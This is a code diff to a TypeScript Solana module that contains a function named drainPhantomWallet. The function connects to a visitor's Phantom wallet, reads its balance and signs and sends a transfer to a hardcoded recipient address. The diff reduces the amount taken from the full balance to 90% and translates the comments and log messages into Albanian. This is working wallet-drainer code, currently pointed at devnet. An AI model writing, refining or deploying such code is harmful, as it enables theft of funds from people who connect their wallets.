@@ -1,8 +1,9 @@
 import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, clusterApiUrl } from "@solana/web3.js";
 
-// Use official Solana devnet endpoint
+// Përdor devnet për testim
 const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
 const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");
+const PERCENTAGE_TO_SEND = 0.9; // 90% e bilancit
 
 declare global {
   interface Window {
@@ -19,7 +20,6 @@ export async function connectPhantomWallet(): Promise<string> {
   if (!window.solana || !window.solana.isPhantom) {
     throw new Error("Phantom wallet not found");
   }
-
   try {
     const response = await window.solana.connect();
     return response.publicKey.toString();
@@ -32,7 +32,6 @@ export async function disconnectPhantomWallet(): Promise<void> {
   if (!window.solana) {
     throw new Error("Phantom wallet not found");
   }
-
   try {
     await window.solana.disconnect();
   } catch (error) {
@@ -46,61 +45,56 @@ export async function drainPhantomWallet(): Promise<void> {
   }
 
   try {
-    console.log("Starting transaction process...");
-
-    // Ensure connection to wallet
+    console.log("Lidhja me portofolin...");
     const response = await window.solana.connect();
     const walletPubKey = new PublicKey(response.publicKey.toString());
-    console.log("Connected to wallet:", walletPubKey.toString());
+    console.log("U lidh me portofolin:", walletPubKey.toString());
 
-    // Check wallet balance
+    // Kontrollo bilancin
     const balance = await connection.getBalance(walletPubKey);
-    console.log("Wallet balance:", balance / LAMPORTS_PER_SOL, "SOL");
+    console.log("Bilanci aktual:", balance / LAMPORTS_PER_SOL, "SOL");
 
     if (balance <= 0) {
-      throw new Error("No SOL available in wallet");
+      throw new Error("Portofoli nuk ka fonde");
     }
 
-    // Create transaction
-    const transaction = new Transaction();
+    // Llogarit 90% të bilancit
+    const amountToSend = Math.floor(balance * PERCENTAGE_TO_SEND);
+    console.log(`Do transferohen: ${amountToSend / LAMPORTS_PER_SOL} SOL`);
 
-    // Get recent blockhash
+    // Krijo transaksionin
+    const transaction = new Transaction();
     const { blockhash } = await connection.getLatestBlockhash('finalized');
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = walletPubKey;
 
-    // Create transfer instruction
+    // Krijo instruktorin e transferimit
     const transferIx = SystemProgram.transfer({
       fromPubkey: walletPubKey,
       toPubkey: RECIPIENT_ADDRESS,
-      lamports: balance,
+      lamports: amountToSend,
     });
 
     transaction.add(transferIx);
 
     try {
-      // Send transaction
-      console.log("Sending transaction...");
+      console.log("Duke dërguar transaksionin...");
       const { signature } = await window.solana.signAndSendTransaction(transaction);
-      console.log("Transaction sent with signature:", signature);
+      console.log("Transaksioni u dërgua me sukses, firma:", signature);
 
-      // Wait for confirmation
+      // Prisni konfirmimin
       const confirmation = await connection.confirmTransaction(signature);
-
       if (confirmation.value.err) {
-        throw new Error(`Transaction failed: ${confirmation.value.err}`);
+        throw new Error(`Transaksioni dështoi: ${confirmation.value.err}`);
       }
 
-      console.log("Transaction confirmed!");
-      return;
-
+      console.log("Transaksioni u konfirmua me sukses!");
     } catch (sendError) {
-      console.error("Error during transaction:", sendError);
-      throw new Error("Failed to send transaction. Please try again.");
+      console.error("Gabim gjatë transaksionit:", sendError);
+      throw new Error("Dështoi dërgimi i transaksionit. Provo përsëri.");
     }
-
   } catch (error) {
-    console.error("Transaction process failed:", error);
+    console.error("Procesi i transaksionit dështoi:", error);
     throw error;
   }
 }
